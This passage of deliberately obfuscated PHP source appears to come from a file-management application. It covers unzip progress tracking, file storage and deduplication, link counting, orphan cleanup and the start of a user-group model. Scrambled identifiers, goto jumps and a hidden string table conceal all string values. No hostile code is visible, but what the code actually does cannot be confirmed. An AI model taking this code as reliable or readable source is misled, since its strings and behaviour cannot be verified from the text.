$¢õÄé‘[$êØ€ƒ] = $ÇÜ³´; } if (!$¦«ªÊâ„) { return; } if (!$¢õÄé‘) { return Cache::remove($§Ø§º¬Ã); } Cache::set($§Ø§º¬Ã, $¢õÄé‘, 60); Cache::removeMemory($§Ø§º¬Ã); } public static function finished($ÏéºÍ«¶, $ÚÏÊ¨€) { $’à©‡À =& $_SERVER[§Êá¸İ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($’à©‡À[341] => $ÏéºÍ«¶, $’à©‡À[1877] => $ÚÏÊ¨€); } private static function finishedRun() { $é…©ÁæĞ =& $_SERVER[§Êá¸İ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $§¡‘€•) { try { Hook::apply($§¡‘€•[$é…©ÁæĞ[341]], $§¡‘€•[$é…©ÁæĞ[1877]]); } catch (Exception $Öäœ¿®) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¨•×©à =& $_SERVER[§Êá¸İ]; parent::startAfter(); Hook::bind($¨•×©à[1892], array($this, $¨•×©à[1893])); Hook::bind($¨•×©à[1288], array($this, $¨•×©à[1894])); Hook::bind($¨•×©à[1895], array($this, $¨•×©à[1896])); $œÁ€ÉÚ° =& $this->task; $œÁ€ÉÚ°[$¨•×©à[1897]] = $¨•×©à[1289]; if (!$œÁ€ÉÚ°[$¨•×©à[1668]]) { $œÁ€ÉÚ°[$¨•×©à[1668]] = LNG($¨•×©à[1898]); } } protected function endAfter() { $û©ÈóØ‰ =& $_SERVER[§Êá¸İ]; parent::endAfter(); Hook::unbind($û©ÈóØ‰[1892], array($this, $û©ÈóØ‰[1893])); Hook::unbind($û©ÈóØ‰[1288], array($this, $û©ÈóØ‰[1894])); Hook::unbind($û©ÈóØ‰[1895], array($this, $û©ÈóØ‰[1896])); } public function updateAfter() { $¦ÍòÏÏ¿ =& $_SERVER[§Êá¸İ]; $“æ×Œƒ =& $this->task; if (!$“æ×Œƒ[$¦ÍòÏÏ¿[1151]] || !$“æ×Œƒ[$¦ÍòÏÏ¿[850]]) { if ($“æ×Œƒ[$¦ÍòÏÏ¿[1897]] != $¦ÍòÏÏ¿[389]) { return; } } if ($“æ×Œƒ[$¦ÍòÏÏ¿[1897]] == $¦ÍòÏÏ¿[1289]) { $¹ø–üÕ = 0; if ($“æ×Œƒ[$¦ÍòÏÏ¿[1832]]) { $¹ø–üÕ = $“æ×Œƒ[$¦ÍòÏÏ¿[1833]] / $“æ×Œƒ[$¦ÍòÏÏ¿[1832]]; } $“æ×Œƒ[$¦ÍòÏÏ¿[1781]] = $¹ø–üÕ * 0.3; } else { if ($“æ×Œƒ[$¦ÍòÏÏ¿[1897]] == $¦ÍòÏÏ¿[389]) { $¹ø–üÕ = $“æ×Œƒ[$¦ÍòÏÏ¿[1780]] / $“æ×Œƒ[$¦ÍòÏÏ¿[1151]]; $“æ×Œƒ[$¦ÍòÏÏ¿[1781]] = 0.3 + $¹ø–üÕ * 0.4; } else { if ($“æ×Œƒ[$¦ÍòÏÏ¿[1897]] == $¦ÍòÏÏ¿[110]) { $º™üÅÖÇ = 0; if ($“æ×Œƒ[$¦ÍòÏÏ¿[1834]] == $¦ÍòÏÏ¿[110]) { $º™üÅÖÇ = $“æ×Œƒ[$¦ÍòÏÏ¿[1833]]; } $¹ø–üÕ = ($“æ×Œƒ[$¦ÍòÏÏ¿[1837]] + $º™üÅÖÇ) / $“æ×Œƒ[$¦ÍòÏÏ¿[850]]; $“æ×Œƒ[$¦ÍòÏÏ¿[1781]] = 0.3 + 0.4 + $¹ø–üÕ * 0.3; } } } if ($“æ×Œƒ[$¦ÍòÏÏ¿[1781]] > 0) { $®±ôÅüğ = timeFloat() - $“æ×Œƒ[$¦ÍòÏÏ¿[1783]] - $“æ×Œƒ[$¦ÍòÏÏ¿[1786]]; $“æ×Œƒ[$¦ÍòÏÏ¿[1787]] = $®±ôÅüğ * (1 - $“æ×Œƒ[$¦ÍòÏÏ¿[1781]]) / $“æ×Œƒ[$¦ÍòÏÏ¿[1781]]; } } public function addFile($£ÃÀÓœ•) { $¨ÑäÙÄ =& $_SERVER[§Êá¸İ]; $´ŠÓğ¥Û =& $this->task; $âê€â¬Ù = IO::info($£ÃÀÓœ•); $´ŠÓğ¥Û[$¨ÑäÙÄ[1830]] = $âê€â¬Ù[$¨ÑäÙÄ[32]]; $´ŠÓğ¥Û[$¨ÑäÙÄ[1832]] = $âê€â¬Ù[$¨ÑäÙÄ[79]]; $´ŠÓğ¥Û[$¨ÑäÙÄ[1833]] = 0; $´ŠÓğ¥Û[$¨ÑäÙÄ[1153]] = $¨ÑäÙÄ[1853]; $´ŠÓğ¥Û[$¨ÑäÙÄ[1834]] = $¨ÑäÙÄ[1289]; $´ŠÓğ¥Û[$¨ÑäÙÄ[850]] = $âê€â¬Ù[$¨ÑäÙÄ[79]]; $´ŠÓğ¥Û[$¨ÑäÙÄ[1151]] = 1; $¥ÃĞéòõ = 0; $´ŠÓğ¥Û[$¨ÑäÙÄ[1841]] = array($¨ÑäÙÄ[1842] => $¥ÃĞéòõ + 1, $¨ÑäÙÄ[502] => $âê€â¬Ù[$¨ÑäÙÄ[32]], $¨ÑäÙÄ[87] => $âê€â¬Ù[$¨ÑäÙÄ[87]], $¨ÑäÙÄ[590] => $âê€â¬Ù[$¨ÑäÙÄ[590]] ? $âê€â¬Ù[$¨ÑäÙÄ[590]] : $âê€â¬Ù[$¨ÑäÙÄ[87]]); $this->update(); } public function zipEvent($Î´¿ßÈ‹, $Áö£Äİ÷, $ÎıÙ¦ö, $µ¾šÈ±) { $‚šŸš =& $_SERVER[§Êá¸İ]; $§óœÅé‹ =& $this->task; $§óœÅé‹[$‚šŸš[1830]] = get_path_this($Áö£Äİ÷); $§óœÅé‹[$‚šŸš[1832]] = $µ¾šÈ±; $§óœÅé‹[$‚šŸš[1833]] = $ÎıÙ¦ö; $§óœÅé‹[$‚šŸš[1153]] = $Î´¿ßÈ‹ == $‚šŸš[1899] ? $‚šŸš[1900] : $‚šŸš[1901]; $§óœÅé‹[$‚šŸš[1834]] = $‚šŸš[12]; $§óœÅé‹[$‚šŸš[850]] = $µ¾šÈ±; $§óœÅé‹[$‚šŸš[1897]] = $‚šŸš[389]; $this->update(); } public function unzipAfter($œäÜçªÙ) { $Å¡ÙÙæ =& $_SERVER[§Êá¸İ]; $ªğÀâ²º =& $this->task; $ªğÀâ²º[$Å¡ÙÙæ[1897]] = $Å¡ÙÙæ[110]; $Ô©³Ã€¼ = IO::infoWithChildren($œäÜçªÙ); $…Ü†ˆº¸ = 0; $ªğÀâ²º[$Å¡ÙÙæ[1841]] = array($Å¡ÙÙæ[1842] => $…Ü†ˆº¸ + 1, $Å¡ÙÙæ[502] => $Ô©³Ã€¼[$Å¡ÙÙæ[32]], $Å¡ÙÙæ[87] => $Ô©³Ã€¼[$Å¡ÙÙæ[87]], $Å¡ÙÙæ[590] => $Ô©³Ã€¼[$Å¡ÙÙæ[590]] ? $Ô©³Ã€¼[$Å¡ÙÙæ[590]] : $Ô©³Ã€¼[$Å¡ÙÙæ[87]]); if ($Ô©³Ã€¼[$Å¡ÙÙæ[33]] == $Å¡ÙÙæ[230]) { $ªğÀâ²º[$Å¡ÙÙæ[1151]] = 1; } else { $ªğÀâ²º[$Å¡ÙÙæ[1151]] = $Ô©³Ã€¼[$Å¡ÙÙæ[82]][$Å¡ÙÙæ[80]]; } $ªğÀâ²º[$Å¡ÙÙæ[1153]] = $Å¡ÙÙæ[12]; $ªğÀâ²º[$Å¡ÙÙæ[1834]] = 0; $ªğÀâ²º[$Å¡ÙÙæ[1780]] = 0; $ªğÀâ²º[$Å¡ÙÙæ[1832]] = 0; $ªğÀâ²º[$Å¡ÙÙæ[1833]] = 0; $ªğÀâ²º[$Å¡ÙÙæ[1830]] = $Å¡ÙÙæ[12]; $ªğÀâ²º[$Å¡ÙÙæ[1837]] = 0; $ªğÀâ²º[$Å¡ÙÙæ[850]] = $Ô©³Ã€¼[$Å¡ÙÙæ[79]]; $this->update(); self::log($Å¡ÙÙæ[1902] . json_encode(array($ªğÀâ²º, $Ô©³Ã€¼))); } public function nameParse($Ê¬ü¸àµ) { $±œíØâ› =& $_SERVER[§Êá¸İ]; $á‹à‹•Æ =& $this->task; if ($á‹à‹•Æ[$±œíØâ›[1897]] == $±œíØâ›[1289]) { $á‹à‹•Æ[$±œíØâ›[1897]] = $±œíØâ›[389]; $á‹à‹•Æ[$±œíØâ›[1837]] = 0; $á‹à‹•Æ[$±œíØâ›[850]] = 0; } $Ÿ¢Ğô®û = get_path_this($Ê¬ü¸àµ); if (strstr($Ÿ¢Ğô®û, $±œíØâ›[10])) { $á‹à‹•Æ[$±œíØâ›[1780]] += 1; $á‹à‹•Æ[$±œíØâ›[1151]] += 1; } $á‹à‹•Æ[$±œíØâ›[1830]] = $Ê¬ü¸àµ; $this->update(); } } goto bó¨âØã; B§ø²¥¸¶‰: class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\x6c\x65"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\x6d\145" => "\x69\157\137\x66\151\x6c\145\137\155\x65\x74\141", "\x6d\x65\x74\x61\106\x69\x65\154\x64" => "\146\151\x6c\x65\x49\x44"); public function fileInfo($ÊîæÆ¿”) { $‰ƒ’ñ†Æ =& $_SERVER[§Êá¸İ]; static $—êÅˆÅ = array(); if (!isset($—êÅˆÅ[$ÊîæÆ¿”])) { $„»×™İ = $‰ƒ’ñ†Æ[2028]; $†´‰çİ– = Model($‰ƒ’ñ†Æ[552])->field($„»×™İ)->where(array($‰ƒ’ñ†Æ[550] => $ÊîæÆ¿”))->find(); $—êÅˆÅ[$ÊîæÆ¿”] = $†´‰çİ–; } return $—êÅˆÅ[$ÊîæÆ¿”]; } public function addFileByContent($ûéİ„×ş = '', $ÙßµÎ­§ = '') { $©ÙåÛÕœ =& $_SERVER[§Êá¸İ]; $™Ğ‹ÅÄë = TEMP_PATH . $©ÙåÛÕœ[2029]; if (!is_dir($™Ğ‹ÅÄë)) { mk_dir($™Ğ‹ÅÄë); } $ÌÜú§”Ä = $™Ğ‹ÅÄë . $©ÙåÛÕœ[2030] . rand_string(16); file_put_contents($ÌÜú§”Ä, $ûéİ„×ş); $õ©Ê¬¢Ë = $this->addFile($ÌÜú§”Ä, $ÙßµÎ­§, !0); if (file_exists($ÌÜú§”Ä)) { @unlink($ÌÜú§”Ä); } return $õ©Ê¬¢Ë; } public function createFileName($ŸèŒñà°, $öªÁÃğ® = false, $‚ËãÄ¾÷ = false) { $Ş°ßÃÏÄ =& $_SERVER[§Êá¸İ]; $ÕìˆéÓ = IO::init($Ş°ßÃÏÄ[8]); $“‚úÔº‰ = $this->makeFilePath($ŸèŒñà°, $ÕìˆéÓ, $öªÁÃğ®, $‚ËãÄ¾÷); $ÙØû§åÖ = $ÕìˆéÓ->pathFather($“‚úÔº‰); static $™üÖî¼– = false; $±±–‰œ = $Ş°ßÃÏÄ[2031] . md5($ÙØû§åÖ); if (!$™üÖî¼– && !Cache::get($±±–‰œ)) { $™üÖî¼– = !0; $¦‚ÃÕ‡Ò = IO::mkdir($ÙØû§åÖ); if (!IO::exist($¦‚ÃÕ‡Ò . $Ş°ßÃÏÄ[884])) { IO::mkfile($¦‚ÃÕ‡Ò . $Ş°ßÃÏÄ[884]); } Cache::set($±±–‰œ, 1, 3600 * 2); } return $“‚úÔº‰; } public function makeFilePath($…üÉ¼êá, $üÒšê­Ÿ, $ÕÀò¨® = false, $•Õäà = false) { $­à¿¢Â =& $_SERVER[§Êá¸İ]; $İ©éÊÎİ = Model($­à¿¢Â[857])->get($­à¿¢Â[2032]); $ù¢‡êÆ = KodIO::defaultIO() . date($­à¿¢Â[2033]); $†š¹¬ñ» = $ù¢‡êÆ . rand_string(5) . short_id(100); $…üÉ¼êá = str_replace($­à¿¢Â[8], $­à¿¢Â[11], KodIO::clear($…üÉ¼êá)); $µƒÚ±à» = $üÒšê­Ÿ->ext($…üÉ¼êá); if (!$…üÉ¼êá) { $İ©éÊÎİ = $­à¿¢Â[863]; } switch ($İ©éÊÎİ) { case $­à¿¢Â[2034]: if ($µƒÚ±à») { $†š¹¬ñ» = $†š¹¬ñ» . $­à¿¢Â[10] . $µƒÚ±à»; } if ($µƒÚ±à» == $­à¿¢Â[1970]) { $†š¹¬ñ» .= $­à¿¢Â[1301]; } break; case $­à¿¢Â[2035]: $¾ßø®—ë = Model($­à¿¢Â[857])->get($­à¿¢Â[858]); $î’Èğü‹ = substr(md5($­à¿¢Â[859] . $¾ßø®—ë . date($­à¿¢Â[836])), 0, 8); $§¿‰’Ã´ = KodIO::defaultDriver(); $ù¢‡êÆ = $­à¿¢Â[1332] . $§¿‰’Ã´[$­à¿¢Â[483]] . $­à¿¢Â[492] . date($­à¿¢Â[2036]) . $î’Èğü‹ . $­à¿¢Â[8]; if ($µƒÚ±à» == $­à¿¢Â[1970]) { $…üÉ¼êá .= $­à¿¢Â[1301]; } $”§Ñ­öü = $­à¿¢Â[2037] . $ù¢‡êÆ . $…üÉ¼êá; CacheLock::lock($”§Ñ­öü); $†š¹¬ñ» = $ù¢‡êÆ . $…üÉ¼êá; if (IO::exist($ù¢‡êÆ . $…üÉ¼êá)) { $÷•šÔî‚ = substr($…üÉ¼êá, 0, strlen($…üÉ¼êá) - strlen($µƒÚ±à»)); $Ì‘˜»­Ì = $•Õäà ? substr($•Õäà, 0, 5) : ($ÕÀò¨® ? substr($ÕÀò¨®, 0, 5) : rand_string(5)); $†š¹¬ñ» = $ù¢‡êÆ . $÷•šÔî‚ . $Ì‘˜»­Ì; if ($µƒÚ±à») { $†š¹¬ñ» = $†š¹¬ñ» . $­à¿¢Â[10] . $µƒÚ±à»; } } if (IO::isOsDriver($†š¹¬ñ») && !IO::isUploadServer($†š¹¬ñ»)) { if (IO::exist($†š¹¬ñ»)) { return $†š¹¬ñ»; } $²ª·É³ = IO::setContent($†š¹¬ñ», $­à¿¢Â[12]); if (!$²ª·É³) { show_json($­à¿¢Â[2038], !1); } } CacheLock::unlock($”§Ñ­öü); break; case $­à¿¢Â[863]: break; default: break; } return $†š¹¬ñ»; } public function addFileByRemote($‘º¯Ğ×§, $†¤ìŸá¿, $åÖ—›Œ = array()) { $ñ‡ãÚ¡İ =& $_SERVER[§Êá¸İ]; if (!IO::exist($‘º¯Ğ×§)) { return !1; } $Û¥°œ”î = $åÖ—›Œ[$ñ‡ãÚ¡İ[555]] ? $åÖ—›Œ[$ñ‡ãÚ¡İ[555]] : $ñ‡ãÚ¡İ[12]; $«åÅ‹Å§ = IO::hashMd5($‘º¯Ğ×§, $Û¥°œ”î); $Á¼ñÇò = KodIO::defaultDriver(); $ûĞ¯ÛÉ© = array($ñ‡ãÚ¡İ[625] => IO::size($‘º¯Ğ×§), $ñ‡ãÚ¡İ[2039] => 1, $ñ‡ãÚ¡İ[502] => $†¤ìŸá¿, $ñ‡ãÚ¡İ[895] => $Á¼ñÇò[$ñ‡ãÚ¡İ[483]], $ñ‡ãÚ¡İ[503] => $‘º¯Ğ×§, $ñ‡ãÚ¡İ[2040] => $åÖ—›Œ[$ñ‡ãÚ¡İ[680]] ? $åÖ—›Œ[$ñ‡ãÚ¡İ[680]] : IO::hashSimple($‘º¯Ğ×§), $ñ‡ãÚ¡İ[2041] => $«åÅ‹Å§ ? $«åÅ‹Å§ : $Û¥°œ”î); if ($—ÈéçöÉ = $this->addFileCheckExist($ûĞ¯ÛÉ©[$ñ‡ãÚ¡İ[680]], $ûĞ¯ÛÉ©[$ñ‡ãÚ¡İ[555]], $ûĞ¯ÛÉ©[$ñ‡ãÚ¡İ[79]])) { return $—ÈéçöÉ; } return $this->addFileData($ûĞ¯ÛÉ©); } private function addFileData($ÉûõØ÷ã) { $à©À•ü =& $_SERVER[§Êá¸İ]; if (!$ÉûõØ÷ã) { return !1; } $ÉûõØ÷ã[$à©À•ü[79]] = intval($ÉûõØ÷ã[$à©À•ü[79]]); if (!$ÉûõØ÷ã[$à©À•ü[79]] && strlen($ÉûõØ÷ã[$à©À•ü[680]]) > 32) { $ÉûõØ÷ã[$à©À•ü[79]] = intval(substr($ÉûõØ÷ã[$à©À•ü[680]], 32)); } $”é¢œÊˆ = $this->add($ÉûõØ÷ã); return $this->find($”é¢œÊˆ); } public function addFile($Ùû±ñ´Û, $è–çË¦ş, $º—ˆã¼‚ = false) { $Ò¬äî¼Ø =& $_SERVER[§Êá¸İ]; $ÌÉíĞşÜ = IO::hashSimple($Ùû±ñ´Û); $÷Ñ‚¡‡ø = IO::size($Ùû±ñ´Û); $Ï¼ù¶¬ñ = $÷Ñ‚¡‡ø <= 1024 * 1024 * 10 ? IO::hashMd5($Ùû±ñ´Û) : $Ò¬äî¼Ø[12]; $â›½ÆòÒ = $Ò¬äî¼Ø[2042] . $ÌÉíĞşÜ; CacheLock::lock($â›½ÆòÒ); if ($Ï¼ù¶¬ñ && $ÌÉíĞşÜ) { $õ¨İ  = $this->addFileCheckExist($ÌÉíĞşÜ, $Ï¼ù¶¬ñ, $÷Ñ‚¡‡ø); if ($õ¨İ ) { CacheLock::unlock($â›½ÆòÒ); return $õ¨İ ; } } $¿ôø‰¥ = $this->addFileMake($Ùû±ñ´Û, $÷Ñ‚¡‡ø, $ÌÉíĞşÜ, $Ï¼ù¶¬ñ, $è–çË¦ş, $º—ˆã¼‚); $…ÆÎíƒ = $this->addFileData($¿ôø‰¥); CacheLock::unlock($â›½ÆòÒ); if (!$Ï¼ù¶¬ñ && $…ÆÎíƒ) { $this->fileMd5Check($…ÆÎíƒ); } return $…ÆÎíƒ; } public function fileMd5Check($·…‹ëëŞ) { $ïèõÜôì =& $_SERVER[§Êá¸İ]; $ôé™á¿Ê = array($·…‹ëëŞ[$ïèõÜôì[549]], $·…‹ëëŞ[$ïèõÜôì[87]]); $¼ñõ¢˜ = $ïèõÜôì[2043] . $·…‹ëëŞ[$ïèõÜôì[87]]; $ğ¾¾Í€¼ = $ïèõÜôì[2044] . $·…‹ëëŞ[$ïèõÜôì[549]]; TaskQueue::add($ïèõÜôì[2045], $ôé™á¿Ê, $¼ñõ¢˜, $ğ¾¾Í€¼); } public function fileMd5Set($ú¥ïŒÂÌ, $ÇÖœæ²×) { $ÄÜô©–å =& $_SERVER[§Êá¸İ]; $óç–›§Ô = $this->find($ú¥ïŒÂÌ); if (!$óç–›§Ô || $óç–›§Ô[$ÄÜô©–å[555]]) { return; } $ìÂÏÈµæ = IO::hashMd5($ÇÖœæ²×); if (!$ìÂÏÈµæ) { return $ÄÜô©–å[12]; } $this->where(array($ÄÜô©–å[549] => $ú¥ïŒÂÌ))->save(array($ÄÜô©–å[555] => $ìÂÏÈµæ)); } public function addFileMake($æÈ«Ò, $Îç££ø¢, $áËÖ‰¦, $ÏÈôËŒ, $ğªËûä, $ÙŞ¿«Ìñ) { $¦´ì¡úõ =& $_SERVER[§Êá¸İ]; $§´ªÇ¸© = $this->createFileName($ğªËûä, $áËÖ‰¦, $ÏÈôËŒ); $ÌŒ­˜ˆÌ = get_path_father($§´ªÇ¸©); $ƒÎÎò† = get_path_this($§´ªÇ¸©); if ($ÙŞ¿«Ìñ) { $ïÒä…óÁ = IO::move($æÈ«Ò, $ÌŒ­˜ˆÌ, !1, $ƒÎÎò†); } else { $ïÒä…óÁ = IO::copy($æÈ«Ò, $ÌŒ­˜ˆÌ, !1, $ƒÎÎò†); } if (!$ïÒä…óÁ) { return !1; } $µ·óìÊã = KodIO::defaultDriver(); $™’ıöşí = array($¦´ì¡úõ[625] => $Îç££ø¢, $¦´ì¡úõ[2039] => 1, $¦´ì¡úõ[502] => $ğªËûä, $¦´ì¡úõ[895] => $µ·óìÊã[$¦´ì¡úõ[483]], $¦´ì¡úõ[503] => $§´ªÇ¸©, $¦´ì¡úõ[2040] => $áËÖ‰¦, $¦´ì¡úõ[2041] => $ÏÈôËŒ); return $™’ıöşí; } public function addFileCheckExist($ôú˜ª£, $íÒ‡†£•, $Óœµü) { $Šæ±ñş¿ =& $_SERVER[§Êá¸İ]; $Ú‰ÒÅëí = $this->findByHash($ôú˜ª£, $íÒ‡†£•); if (!$Ú‰ÒÅëí) { return !1; } $ÆıÖÖá½ = array($Šæ±ñş¿[2039] => intval($Ú‰ÒÅëí[$Šæ±ñş¿[2046]]) + 1, $Šæ±ñş¿[625] => $Óœµü); $this->where(array($Šæ±ñş¿[550] => $Ú‰ÒÅëí[$Šæ±ñş¿[549]]))->save($ÆıÖÖá½); return $Ú‰ÒÅëí; } public function remove($¥ıÚ¥©) { $this->linkCountChange($¥ıÚ¥©, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÔèŸæñ¥) { $this->linkCountChange($ÔèŸæñ¥, !0); } public function linkCountChange($ûõ¥²Ê³, $º„´Ğª‚) { $á¯†»ø‡ =& $_SERVER[§Êá¸İ]; if (!$ûõ¥²Ê³) { return; } if (!is_array($ûõ¥²Ê³)) { $ûõ¥²Ê³ = array($ûõ¥²Ê³); } $äüÀ€® = array(); foreach ($ûõ¥²Ê³ as $¢Ò½›»Ó) { $İ‘ÕøÊ = $¢Ò½›»Ó . $á¯†»ø‡[12]; if (!$äüÀ€®[$İ‘ÕøÊ]) { $äüÀ€®[$İ‘ÕøÊ] = 0; } $äüÀ€®[$İ‘ÕøÊ]++; } $åıò—Åƒ = array(); foreach ($äüÀ€® as $¢Ò½›»Ó => $éŸ¹¥ßê) { $İ‘ÕøÊ = $éŸ¹¥ßê . $á¯†»ø‡[12]; if (!$åıò—Åƒ[$İ‘ÕøÊ]) { $åıò—Åƒ[$İ‘ÕøÊ] = array(); } $åıò—Åƒ[$İ‘ÕøÊ][] = $¢Ò½›»Ó; } foreach ($åıò—Åƒ as $éŸ¹¥ßê => $ßŒÀàŒ³) { if (!$ßŒÀàŒ³) { continue; } $éŸ¹¥ßê = $º„´Ğª‚ ? $éŸ¹¥ßê : -intval($éŸ¹¥ßê); $ÄŸ€À„¿ = array($á¯†»ø‡[549] => array($á¯†»ø‡[7], $ßŒÀàŒ³)); if ($éŸ¹¥ßê < 0) { $ÄŸ€À„¿[$á¯†»ø‡[2046]] = array($á¯†»ø‡[1103], abs($éŸ¹¥ßê)); } $this->where($ÄŸ€À„¿)->setAdd($á¯†»ø‡[2046], $éŸ¹¥ßê); } } public function findByHash($äîµ­ÆÛ, $¤úìı®™ = false) { $éï¨È”» =& $_SERVER[§Êá¸İ]; if (!$äîµ­ÆÛ && !$¤úìı®™) { return !1; } $•Îˆò£È = array($éï¨È”»[2040] => $äîµ­ÆÛ); if ($¤úìı®™) { $•Îˆò£È = array($éï¨È”»[2041] => $¤úìı®™); } return $this->order($éï¨È”»[2047])->where($•Îˆò£È)->find(); } public function clearEmpty($±³ïÚŒå = 0) { $â‘¾¦èú =& $_SERVER[§Êá¸İ]; $ÖÎ›¥âç = time() - 3600 * 24 * $±³ïÚŒå; $ªöéá‡Â = $â‘¾¦èú[2048] . $ÖÎ›¥âç; $¸¯ÖÊÊ« = $this->where($ªöéá‡Â)->select(); if (!$¸¯ÖÊÊ«) { return; } $¾­ÜğÀ¤ = new Task($â‘¾¦èú[2049], $â‘¾¦èú[12], count($¸¯ÖÊÊ«)); foreach ($¸¯ÖÊÊ« as $ÉÊ €Óƒ) { $¾­ÜğÀ¤->update(1); $this->resetFile($ÉÊ €Óƒ); } $¾­ÜğÀ¤->end(); } public function resetFile($Ø…¹‹…Ô) { $Û™û¤° =& $_SERVER[§Êá¸İ]; $Á„ğà = array($Û™û¤°[550] => $Ø…¹‹…Ô[$Û™û¤°[549]]); $Şƒ ¢ıÎ = Model($Û™û¤°[1428])->where($Á„ğà)->count(); $õ¹–¼£¾ = Model($Û™û¤°[2050])->where($Á„ğà)->count(); $ÎÃÕ§§ = intval($Şƒ ¢ıÎ) + intval($õ¹–¼£¾); if ($ÎÃÕ§§ == 0) { IO::remove($Ø…¹‹…Ô[$Û™û¤°[87]]); Model($Û™û¤°[2051])->delete($Ø…¹‹…Ô[$Û™û¤°[549]]); $this->where($Á„ğà)->delete(); $this->metaSet($Ø…¹‹…Ô[$Û™û¤°[549]], null, null); write_log(ACTION . $Û™û¤°[2052] . KodUser::id() . $Û™û¤°[2053] . $Ø…¹‹…Ô[$Û™û¤°[549]] . $Û™û¤°[2054] . $Ø…¹‹…Ô[$Û™û¤°[79]] . $Û™û¤°[201] . $Ø…¹‹…Ô[$Û™û¤°[87]], $Û™û¤°[2055]); return; } if ($Ø…¹‹…Ô[$Û™û¤°[2046]] != $ÎÃÕ§§) { $this->where($Á„ğà)->save(array($Û™û¤°[2039] => $ÎÃÕ§§)); } } public function storageInfo($›Åó›’ = false) { $‡¨¬íÈ‚ =& $_SERVER[§Êá¸İ]; $ğ°¶ = $this->count() + 0.0; $œÔÀÁ¹ = 0; $Š˜·ËÙ = 1; $ÅŠÌÎ˜¥ = 0; $™óÎÅÛò = 5000; for ($½Œ§ÉŒù = 0; $½Œ§ÉŒù < $ğ°¶; $½Œ§ÉŒù = $½Œ§ÉŒù + $™óÎÅÛò) { $÷•œî“• = $this->limit($½Œ§ÉŒù, $½Œ§ÉŒù + $™óÎÅÛò)->select(); foreach ($÷•œî“• as $éÃÅË€İ) { $Š˜·ËÙ += $éÃÅË€İ[$‡¨¬íÈ‚[79]] * $éÃÅË€İ[$‡¨¬íÈ‚[2046]]; $œÔÀÁ¹ += $éÃÅË€İ[$‡¨¬íÈ‚[79]] * ($éÃÅË€İ[$‡¨¬íÈ‚[2046]] - 1); $ÅŠÌÎ˜¥ += $éÃÅË€İ[$‡¨¬íÈ‚[2046]]; } } $ë—çÇö = array($‡¨¬íÈ‚[2056] => $Š˜·ËÙ, $‡¨¬íÈ‚[2057] => $œÔÀÁ¹, $‡¨¬íÈ‚[2058] => $œÔÀÁ¹ / $Š˜·ËÙ, $‡¨¬íÈ‚[83] => $ğ°¶, $‡¨¬íÈ‚[2059] => $ÅŠÌÎ˜¥); return $ë—çÇö; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\155\145" => "\x67\162\x6f\165\x70\x5f\155\145\x74\x61", "\x6d\x65\164\141\x46\151\x65\154\x64" => "\x67\x72\157\165\160\111\x44"); protected function cacheFunctionAlias($÷î¿¯İÔ) { $ˆÛ™¸« =& $_SERVER[§Êá¸İ]; return array($ˆÛ™¸«[2060] => array($÷î¿¯İÔ[0], $ˆÛ™¸«[2061]), $ˆÛ™¸«[2062] => array($÷î¿¯İÔ[0], $ˆÛ™¸«[2063])); } protected function getInfo($Š™ğßÆß, $§»Š‰°œ = false) { $­«÷Ş’ = $this->getInfoSimple($Š™ğßÆß); if (!$­«÷Ş’) { return !1; } if ($§»Š‰°œ) { return $this->_listDataApplyItem($­«÷Ş’); } return $this->cacheFunctionGet($_SERVER[§Êá¸İ][2064], $Š™ğßÆß); } protected function getInfoSimple($Ù€±Ñ°û, $™‘­¬ûÙ = false) { $ß‡…äÒª =& $_SERVER[§Êá¸İ]; if ($™‘­¬ûÙ) { $ÚÂÑÉíğ = array($ß‡…äÒª[1978] => intval($Ù€±Ñ°û)); $Ş¦ÍĞªõ = $this->where($ÚÂÑÉíğ)->find(); return is_array($Ş¦ÍĞªõ) ? $Ş¦ÍĞªõ : array(); } return $this->cacheFunctionGet($ß‡…äÒª[2065], $Ù€±Ñ°û); } protected function groupAdd($ã¶ß¨º) { $šÉ¡‰ÍÁ =& $_SERVER[§Êá¸İ]; if (!$ã¶ß¨º[$šÉ¡‰ÍÁ[192]] && isset($ã¶ß¨º[$šÉ¡‰ÍÁ[1978]]) && $ã¶ß¨º[$šÉ¡‰ÍÁ[1978]] == 1) { if ($ÈæÉôİş = $this->getInfoSimple($ã¶ß¨º[$šÉ¡‰ÍÁ[1978]], !0)) { return $ã¶ß¨º[$šÉ¡‰ÍÁ[1978]]; } } else { $ÈæÉôİş = $this->getInfoSimple($ã¶ß¨º[$šÉ¡‰ÍÁ[192]]); if (!$ÈæÉôİş) { return !1; } } $ëÛ‘š• = $šÉ¡‰ÍÁ[602]; if ($ÈæÉôİş[$šÉ¡‰ÍÁ[592]]) { $ëÛ‘š• = $ÈæÉôİş[$šÉ¡‰ÍÁ[592]] . $ÈæÉôİş[$šÉ¡‰ÍÁ[1978]] . $šÉ¡‰ÍÁ[50]; } $£–¨î”Ï = array($šÉ¡‰ÍÁ[502] => $this->groupNameAuto($ã¶ß¨º[$šÉ¡‰ÍÁ[192]], $ã¶ß¨º[$šÉ¡‰ÍÁ[32]]), $šÉ¡‰ÍÁ[485] => $ã¶ß¨º[$šÉ¡‰ÍÁ[192]], $šÉ¡‰ÍÁ[660] => $ëÛ‘š•, $šÉ¡‰ÍÁ[2066] => $ã¶ß¨º[$šÉ¡‰ÍÁ[1964]], $šÉ¡‰ÍÁ[2067] => 0, $šÉ¡‰ÍÁ[1982] => 0); if (isset($ã¶ß¨º[$šÉ¡‰ÍÁ[2002]])) { $£–¨î”Ï[$šÉ¡‰ÍÁ[2002]] = $ã¶ß¨º[$šÉ¡‰ÍÁ[2002]]; } else { $ô›õÑ = $this->max($šÉ¡‰ÍÁ[2002]); if (!$ô›õÑ) { $ô›õÑ = 0; } $£–¨î”Ï[$šÉ¡‰ÍÁ[2002]] = $ô›õÑ + 1; } if (!empty($ã¶ß¨º[$šÉ¡‰ÍÁ[1978]])) { $£–¨î”Ï[$šÉ¡‰ÍÁ[1978]] = $ã¶ß¨º[$šÉ¡‰ÍÁ[1978]]; } $‘‹‘–„ô = $this->add($£–¨î”Ï); $this->setNamePinyin($‘‹‘–„ô, 